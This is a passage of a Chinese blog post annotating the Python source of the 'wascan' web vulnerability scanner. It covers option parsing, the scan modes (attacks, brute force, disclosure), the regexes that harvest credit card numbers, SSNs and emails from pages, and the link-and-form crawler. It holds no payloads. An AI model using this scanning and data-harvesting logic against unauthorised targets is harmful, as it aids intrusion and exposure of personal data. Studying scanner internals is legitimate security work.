class="keyword">in</span> (<span class="string">'-t'</span>,<span class="string">'--timeout'</span>):kwargs[<span class="string">'timeout'</span>] = float(arg) </div><div class="line">	<span class="comment"># 对于302情况，是否要跟随，默认为 False不跳转</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-n'</span>,<span class="string">'--redirect'</span>):kwargs[<span class="string">'redirect'</span>] = <span class="keyword">False</span></div><div class="line">	<span class="comment"># 是否开启指纹识别</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-v'</span>,<span class="string">'--verbose'</span>):verbose = <span class="keyword">True</span></div><div class="line">	<span class="comment"># 输出版本信息</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-V'</span>,<span class="string">'--version'</span>):version = Version()</div><div class="line">	<span class="comment"># 输出帮助信息</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-hh'</span>,<span class="string">'--help'</span>):self.usage.basic(<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<p><code>scan</code>参数为扫描类型，对应如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">scan值</th>
<th style="text-align:center">扫描类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">指纹Fingerprint</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">攻击Attacks</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">审计Audit</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">爆破Brute</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">信息搜集Disclosure</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">全面扫描</td>
</tr>
</tbody>
</table>
</div>
<p>对应代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">wascan</span><span class="params">(object)</span>:</span></div><div class="line">    ...省略...</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></div><div class="line">		...省略...</div><div class="line">		scan = <span class="string">"5"</span></div><div class="line">		...省略...</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			<span class="comment"># 打印时间和URL</span></div><div class="line">			PTIME(url)</div><div class="line">			<span class="keyword">if</span> kwargs[<span class="string">'brute'</span>]:</div><div class="line">				BruteParams(kwargs,url,kwargs[<span class="string">'data'</span>]).run()</div><div class="line">			<span class="keyword">if</span> scan == <span class="number">0</span>:</div><div class="line">				Fingerprint(kwargs,url).run()</div><div class="line">			<span class="keyword">if</span> scan == <span class="number">1</span>:</div><div class="line">				Attacks(kwargs,url,kwargs[<span class="string">'data'</span>])</div><div class="line">			<span class="keyword">if</span> scan == <span class="number">2</span>:</div><div class="line">				Audit(kwargs,url,kwargs[<span class="string">'data'</span>])</div><div class="line">			<span class="keyword">if</span> scan == <span class="number">3</span>:</div><div class="line">				Brute(kwargs,url,kwargs[<span class="string">'data'</span>])</div><div class="line">			<span class="keyword">if</span> scan == <span class="number">4</span>:</div><div class="line">				Disclosure(kwargs,url,kwargs[<span class="string">'data'</span>]).run()</div><div class="line">			<span class="comment"># full scan  </span></div><div class="line">			<span class="keyword">if</span> int(scan) == <span class="number">5</span>:</div><div class="line">				info(<span class="string">'Starting full scan module...'</span>)</div><div class="line">				Fingerprint(kwargs,url).run()</div><div class="line">				<span class="keyword">for</span> u <span class="keyword">in</span> Crawler().run(kwargs,url,kwargs[<span class="string">'data'</span>]):</div><div class="line">					test(<span class="string">'Testing URL: %s'</span>%(u))</div><div class="line">					<span class="keyword">if</span> <span class="string">'?'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</div><div class="line">						warn(<span class="string">'Not found query in this URL... Skipping..'</span>)</div><div class="line">					<span class="keyword">if</span> type(u[<span class="number">0</span>]) <span class="keyword">is</span> tuple:</div><div class="line">						kwargs[<span class="string">'data'</span>] = u[<span class="number">1</span>]</div><div class="line">						FullScan(kwargs,u[<span class="number">0</span>],kwargs[<span class="string">'data'</span>])</div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						FullScan(kwargs,u,kwargs[<span class="string">'data'</span>])</div><div class="line">				Audit(kwargs,parse.netloc,kwargs[<span class="string">'data'</span>])</div><div class="line">				Brute(kwargs,parse.netloc,kwargs[<span class="string">'data'</span>])</div><div class="line">		<span class="keyword">except</span> WascanUnboundLocalError,e:</div><div class="line">			<span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
<h1 id="lib-parser-文件夹"><a href="#lib-parser-文件夹" class="headerlink" title="lib/parser 文件夹"></a>lib/parser 文件夹</h1><p>主要定义一些匹配模式，用于查找页面上的各种信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">│   ├── parser</div><div class="line">│   │   ├── getcc.py</div><div class="line">│   │   ├── getip.py</div><div class="line">│   │   ├── getmail.py</div><div class="line">│   │   ├── getssn.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   └── parse.py</div></pre></td></tr></table></figure></p>
<h2 id="信用卡：lib-parser-getcc-py"><a href="#信用卡：lib-parser-getcc-py" class="headerlink" title="信用卡：lib/parser/getcc.py"></a>信用卡：lib/parser/getcc.py</h2><p>获取信用卡信息<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcc</span><span class="params">(content)</span>:</span></div><div class="line">	<span class="string">"""Credit Card"""</span></div><div class="line">	CC_LIST = re.findall(<span class="string">r'((^|\s)\d&#123;4&#125;[- ]?(\d&#123;4&#125;[- ]?\d&#123;4&#125;|\d&#123;6&#125;)[- ]?(\d&#123;5&#125;|\d&#123;4&#125;)($|\s))'</span>,content)</div><div class="line">	<span class="keyword">if</span> CC_LIST != <span class="keyword">None</span> <span class="keyword">or</span> CC_LIST != []:</div><div class="line">		<span class="keyword">return</span> CC_LIST</div></pre></td></tr></table></figure></p>
<h2 id="IP：lib-parser-getip-py"><a href="#IP：lib-parser-getip-py" class="headerlink" title="IP：lib/parser/getip.py"></a>IP：lib/parser/getip.py</h2><p>获取ip<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getip</span><span class="params">(content)</span>:</span></div><div class="line">	<span class="string">"""Private IP"""</span></div><div class="line">	IP_LIST = re.findall(<span class="string">r'[0-9]+(?:\.[0-9]+)&#123;3&#125;'</span>,content,re.I)</div><div class="line">	<span class="keyword">if</span> IP_LIST != <span class="keyword">None</span> <span class="keyword">or</span> IP_LIST != []:</div><div class="line">		<span class="keyword">return</span> IP_LIST</div></pre></td></tr></table></figure></p>
<h2 id="邮箱：lib-parer-getmail-py"><a href="#邮箱：lib-parer-getmail-py" class="headerlink" title="邮箱：lib/parer/getmail.py"></a>邮箱：lib/parer/getmail.py</h2><p>获取邮箱<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmail</span><span class="params">(content)</span>:</span></div><div class="line">	<span class="string">"""E-mail"""</span></div><div class="line">	EMAIL_LIST = re.findall(<span class="string">r'[a-zA-Z0-9.\-_+#~!$&amp;\',;=:]+@+[a-zA-Z0-9-]*\.\w*'</span>,content)</div><div class="line">	<span class="keyword">if</span> EMAIL_LIST != <span class="keyword">None</span> <span class="keyword">or</span> EMAIL_LIST != []:</div><div class="line">		<span class="keyword">return</span> EMAIL_LIST</div></pre></td></tr></table></figure></p>
<h2 id="US-SSN-lib-parser-getssn-py"><a href="#US-SSN-lib-parser-getssn-py" class="headerlink" title="US SSN: lib/parser/getssn.py"></a>US SSN: lib/parser/getssn.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getssn</span><span class="params">(content)</span>:</span></div><div class="line">	<span class="string">"""US Social Security number"""</span></div><div class="line">	SSN_LIST = re.findall(<span class="string">r'(((?!000)(?!666)(?:[0-6]\d&#123;2&#125;|7[0-2][0-9]|73[0-3]|7[5-6][0-9]|77[0-2]))-((?!00)\d&#123;2&#125;)-((?!0000)\d&#123;4&#125;))'</span>,content)</div><div class="line">	<span class="keyword">if</span> SSN_LIST != <span class="keyword">None</span> <span class="keyword">or</span> SSN_LIST != []:</div><div class="line">		<span class="keyword">return</span> SSN_LIST</div></pre></td></tr></table></figure>
<h2 id="抓取解析-lib-parser-parse-py"><a href="#抓取解析-lib-parser-parse-py" class="headerlink" title="抓取解析: lib/parser/parse.py"></a>抓取解析: lib/parser/parse.py</h2><p><code>parse</code>类，进行真正的信息搜集工作。定义了<code>clean</code>方法，将响应中的各种标签，各种可能的符号直接<code>replace</code>掉，然后再进行真正的搜索。简单粗暴。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">parse</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,content)</span>:</span></div><div class="line">		self.content = content </div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">"""Clean HTML Response"""</span></div><div class="line">		self.content = re.sub(<span class="string">'&lt;em&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;b&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;/b&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;strong&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;/strong&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;/em&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;wbr&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;/wbr&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;li&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		self.content = re.sub(<span class="string">'&lt;/li&gt;'</span>,<span class="string">''</span>,self.content)</div><div class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> (<span class="string">'&gt;'</span>, <span class="string">':'</span>, <span class="string">'='</span>, <span class="string">'&lt;'</span>, <span class="string">'/'</span>, <span class="string">'\\'</span>, <span class="string">';'</span>, <span class="string">'&amp;'</span>, <span class="string">'%3A'</span>, <span class="string">'%3D'</span>, <span class="string">'%3C'</span>):</div><div class="line">			self.content = string.replace(self.content,x,<span class="string">' '</span>)</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">getmail</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">"""Get Emails"""</span></div><div class="line">		self.clean()</div><div class="line">		<span class="keyword">return</span> getmail(self.content)</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">getip</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">""" Get IP """</span></div><div class="line">		self.clean()</div><div class="line">		<span class="keyword">return</span> getip(self.content)</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">getcc</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">""" Get Credit Card"""</span></div><div class="line">		self.clean()</div><div class="line">		<span class="keyword">return</span> getcc(self.content)</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">getssn</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">""" """</span></div><div class="line">		self.clean()</div><div class="line">		<span class="keyword">return</span> getssn(self.content)</div></pre></td></tr></table></figure></p>
<h1 id="lib-request-文件夹"><a href="#lib-request-文件夹" class="headerlink" title="lib/request 文件夹"></a>lib/request 文件夹</h1><p>主要是定义一些跟<code>请求</code>相关的方法/类/功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">│   ├── request</div><div class="line">│   │   ├── crawler.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   ├── ragent.py</div><div class="line">│   │   └── request.py</div></pre></td></tr></table></figure></p>
<h2 id="爬虫：lib-request-crawler-py"><a href="#爬虫：lib-request-crawler-py" class="headerlink" title="爬虫：lib/request/crawler.py"></a>爬虫：lib/request/crawler.py</h2><p>如名，爬虫。爬取页面上的所有连接。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span>:</div><div class="line">	<span class="keyword">from</span> BeautifulSoup <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">except</span> ImportError:</div><div class="line">	<span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line"><span class="comment"># 定义了要排除的情况。比如 确定是 7z后缀名，说明是压缩包 而不是网页</span></div><div class="line">EXCLUDED_MEDIA_EXTENSIONS = (</div><div class="line">    <span class="string">'.7z'</span>, <span class="string">'.aac'</span>, <span class="string">'.aiff'</span>, <span class="string">'.au'</span>, <span class="string">'.avi'</span>, <span class="string">'.bin'</span>, <span class="string">'.bmp'</span>, <span class="string">'.cab'</span>, <span class="string">'.dll'</span>, <span class="string">'.dmp'</span>, <span class="string">'.ear'</span>, <span class="string">'.exe'</span>, <span class="string">'.flv'</span>, <span class="string">'.gif'</span>,</div><div class="line">    <span class="string">'.gz'</span>, <span class="string">'.image'</span>, <span class="string">'.iso'</span>, <span class="string">'.jar'</span>, <span class="string">'.jpeg'</span>, <span class="string">'.jpg'</span>, <span class="string">'.mkv'</span>, <span class="string">'.mov'</span>, <span class="string">'.mp3'</span>, <span class="string">'.mp4'</span>, <span class="string">'.mpeg'</span>, <span class="string">'.mpg'</span>, <span class="string">'.pdf'</span>, <span class="string">'.png'</span>,</div><div class="line">    <span class="string">'.ps'</span>, <span class="string">'.rar'</span>, <span class="string">'.scm'</span>, <span class="string">'.so'</span>, <span class="string">'.tar'</span>, <span class="string">'.tif'</span>, <span class="string">'.war'</span>, <span class="string">'.wav'</span>, <span class="string">'.wmv'</span>, <span class="string">'.zip'</span></div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>接下来是爬虫类<code>SCrawler</code>，它继承自<code>Request</code>类。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SCrawler</span><span class="params">(Request)</span>:</span></div><div class="line">	<span class="string">""" Simple Crawler """</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,kwargs,url,data)</span>:</span></div><div class="line">		<span class="comment"># 父类初始化</span></div><div class="line">		Request.__init__(self,kwargs)</div><div class="line">		<span class="comment"># url</span></div><div class="line">		self.url = url </div><div class="line">		<span class="comment"># post 的 data体</span></div><div class="line">		self.data = data</div><div class="line">		<span class="comment"># 表格？</span></div><div class="line">		self.forms = []</div><div class="line">		<span class="comment"># ok 的 链接</span></div><div class="line">		self.ok_links = []</div><div class="line">		<span class="comment"># 所有 链接</span></div><div class="line">		self.all_links = []</div><div class="line">		<span class="comment"># 协议</span></div><div class="line">		self.scheme = urlsplit(url).scheme</div><div class="line">		<span class="comment"># 域名</span></div><div class="line">		self.netloc = urlsplit(url).netloc</div><div class="line">		<span class="comment"># 内容 初始化为 空</span></div><div class="line">		self.content = <span class="keyword">None</span></div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="comment"># send request</span></div><div class="line">		resp = self.Send(url=self.url,data=self.data)</div><div class="line">		<span class="comment"># 获取响应内容</span></div><div class="line">		self.content = resp.content</div><div class="line">		<span class="comment"># 调用extract解析出相应内容</span></div><div class="line">		self.extract </div><div class="line">		<span class="keyword">for</span> link <span class="keyword">in</span> self.all_links:</div><div class="line">			<span class="comment"># 对于 all_links 中的所有链接，包括 绝对URL 、 相对URL</span></div><div class="line">			<span class="comment"># 调用 absolute(link) 统一为 绝对URL</span></div><div class="line">			r_link = self.absolute(link)</div><div class="line">			<span class="keyword">if</span> r_link:</div><div class="line">				<span class="comment"># 如果 r_link 还未被收录到 ok_links 中，则添加</span></div><div class="line">				<span class="keyword">if</span> r_link <span class="keyword">not</span> <span class="keyword">in</span> self.ok_links:</div><div class="line">					self.ok_links.append(r_link)</div><div class="line">		<span class="keyword">return</span> self.ok_links</div><div class="line"></div><div class="line"><span class="meta">	@property</span></div><div class="line">	<span class="comment"># 疑问：&lt;img src="" &gt; 此链接不收取？</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">extract</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="comment"># href 找到页面里所有的 超链接 &lt;a href="http://test/com"&gt;test&lt;/a&gt;</span></div><div class="line">		<span class="keyword">for</span> tag <span class="keyword">in</span> self.soup.findAll(<span class="string">'a'</span>,href=<span class="keyword">True</span>):</div><div class="line">			<span class="comment"># 添加到 all_links 中</span></div><div class="line">			self.all_links.append(tag[<span class="string">'href'</span>].split(<span class="string">'#'</span>)[<span class="number">0</span>])</div><div class="line">		<span class="comment"># src 找到页面里所有的 连接 &lt;frame src=""&gt; &lt;iframe src=""&gt;</span></div><div class="line">		<span class="keyword">for</span> tag <span class="keyword">in</span> self.soup.findAll([<span class="string">'frame'</span>,<span class="string">'iframe'</span>],src=<span class="keyword">True</span>):</div><div class="line">			self.all_links.append(tag[<span class="string">'src'</span>].split(<span class="string">'#'</span>)[<span class="number">0</span>])</div><div class="line">		<span class="comment"># formaction 定位 button 提取formaction &lt;button type="submit" formaction="demo_admin.asp"&gt;以管理员身份提交&lt;/button&gt;</span></div><div class="line">		<span class="keyword">for</span> tag <span class="keyword">in</span> self.soup.findAll(<span class="string">'button'</span>,formaction=<span class="keyword">True</span>):</div><div class="line">			self.all_links.append(tag[<span class="string">'formaction'</span>])</div><div class="line">		<span class="comment"># extract form </span></div><div class="line">		<span class="comment"># &lt;form action="demo_form.asp" method="get"&gt;</span></div><div class="line">		<span class="comment"># 	&lt;input type="text" name="lname" /&gt;</span></div><div class="line">		<span class="comment"># &lt;button type="submit"&gt;提交&lt;/button&gt;&lt;br /&gt;</span></div><div class="line">		form = self.form()</div><div class="line">		<span class="keyword">if</span> form != <span class="keyword">None</span> <span class="keyword">and</span> form != []:</div><div class="line">			<span class="keyword">if</span> form <span class="keyword">not</span> <span class="keyword">in</span> self.all_links:</div><div class="line">				self.all_links.append(form)</div><div class="line"></div><div class="line"><span class="meta">	@property</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">soup</span><span class="params">(self)</span>:</span></div><div class="line">		soup = BeautifulSoup(self.content)</div><div class="line">		<span class="keyword">return</span> soup</div><div class="line"></div><div class="line">	<span class="comment"># 检查link中的 后缀名</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">check_ext</span><span class="params">(self,link)</span>:</span></div><div class="line">		<span class="string">"""check extension"""</span></div><div class="line">		<span class="keyword">if</span> link <span class="keyword">not</span> <span class="keyword">in</span> EXCLUDED_MEDIA_EXTENSIONS:</div><div class="line">			<span class="keyword">return</span> link</div><div class="line"></div><div class="line">	<span class="comment"># 检查是否有定义 method，若无则默认为 GET</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">check_method</span><span class="params">(self,method)</span>:</span></div><div class="line">		<span class="string">"""check method"""</span></div><div class="line">		<span class="keyword">if</span> method != []:</div><div class="line">			<span class="keyword">return</span> <span class="string">"GET"</span></div><div class="line">		<span class="keyword">elif</span> method != []:</div><div class="line">			<span class="keyword">return</span> method[<span class="number">0</span>]</div><div class="line">	</div><div class="line">	<span class="comment"># 检查 url 的合法性</span></div><div class="line">	<span class="comment"># 编码 、空格、 # 等</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">check_url</span><span class="params">(self,url)</span>:</span></div><div class="line">		<span class="string">"""check url"""</span></div><div class="line">		url = unquote_plus(url)</div><div class="line">		url = url.replace(<span class="string">"&amp;amp;"</span>,<span class="string">"&amp;"</span>)</div><div class="line">		url = url.replace(<span class="string">"#"</span>,<span class="string">""</span>)</div><div class="line">		url = url.replace(<span class="string">" "</span>,<span class="string">"+"</span>)</div><div class="line">		<span class="keyword">return</span> url </div><div class="line">	<span class="comment"># 检查 action 对应的值 </span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">check_action</span><span class="params">(self,action,url)</span>:</span></div><div class="line">		<span class="string">""" check form action """</span></div><div class="line">		<span class="keyword">if</span> action == [] <span class="keyword">or</span> action[<span class="number">0</span>] == <span class="string">"/"</span>:</div><div class="line">			<span class="keyword">return</span> self.check_url(url)</div><div class="line">		<span class="keyword">elif</span> action != [] <span class="keyword">and</span> action != <span class="string">""</span>:</div><div class="line">			<span class="keyword">if</span> action[<span class="number">0</span>] <span class="keyword">in</span> url:</div><div class="line">				self.check_url(url)</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				<span class="keyword">return</span> self.check_url(CPath(url+action[<span class="number">0</span>]))</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">check_name_value</span><span class="params">(self,string)</span>:</span></div><div class="line">		<span class="string">""" check form name and value """</span></div><div class="line">		<span class="keyword">if</span> string == []:</div><div class="line">			<span class="keyword">return</span> <span class="string">"TEST"</span></div><div class="line">		<span class="keyword">elif</span> string != []:</div><div class="line">			<span class="keyword">return</span> string[<span class="number">0</span>]</div><div class="line"></div><div class="line">	<span class="comment"># &lt;form action="demo_form.asp" method="get"&gt;</span></div><div class="line">	<span class="comment"># 	&lt;input type="text" name="lname" /&gt;</span></div><div class="line">	<span class="comment"># &lt;button type="submit"&gt;提交&lt;/button&gt;&lt;br /&gt;</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">form</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">""" search forms """</span></div><div class="line">		<span class="comment"># 搜索表格 加入到 self.forms 中</span></div><div class="line">		<span class="keyword">for</span> form <span class="keyword">in</span> self.soup.findAll(<span class="string">'form'</span>):</div><div class="line">			<span class="keyword">if</span> form <span class="keyword">not</span> <span class="keyword">in</span> self.forms:</div><div class="line">				self.forms.append(form)</div><div class="line">		<span class="keyword">for</span> form <span class="keyword">in</span> self.forms:</div><div class="line">			<span class="keyword">if</span> form != <span class="string">""</span> <span class="keyword">and</span> form != <span class="keyword">None</span>:</div><div class="line">				<span class="comment"># 调用 extract_form 将 url 从中解析出来</span></div><div class="line">				<span class="keyword">return</span> self.extract_form(str(form),self.url)</div><div class="line"></div><div class="line">	<span class="comment"># &lt;form action="demo_form.asp" method="get"&gt;</span></div><div class="line">	<span class="comment"># 	&lt;input type="text" name="lname" /&gt;</span></div><div class="line">	<span class="comment"># &lt;button type="submit"&gt;提交&lt;/button&gt;&lt;br /&gt;</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">extract_form</span><span class="params">(self,form,url)</span>:</span></div><div class="line">		<span class="string">""" extract form """</span></div><div class="line">		query = []</div><div class="line">		action = <span class="string">""</span></div><div class="line">		method = <span class="string">""</span></div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			<span class="comment"># method </span></div><div class="line">			method += self.check_method(findall(<span class="string">r'method=[\'\"](.+?)[\'\"]'</span>,form,I))</div><div class="line">			<span class="comment"># action</span></div><div class="line">			action += self.check_action((findall(<span class="string">r'method=[\'\"](.+?)[\'\"]'</span>,form,I),url))</div><div class="line">		<span class="keyword">except</span> Exception,e:</div><div class="line">			<span class="keyword">pass</span></div><div class="line">		<span class="comment"># 寻找form中的参数 ，并保存到 query 中</span></div><div class="line">		<span class="keyword">for</span> inputs <span class="keyword">in</span> 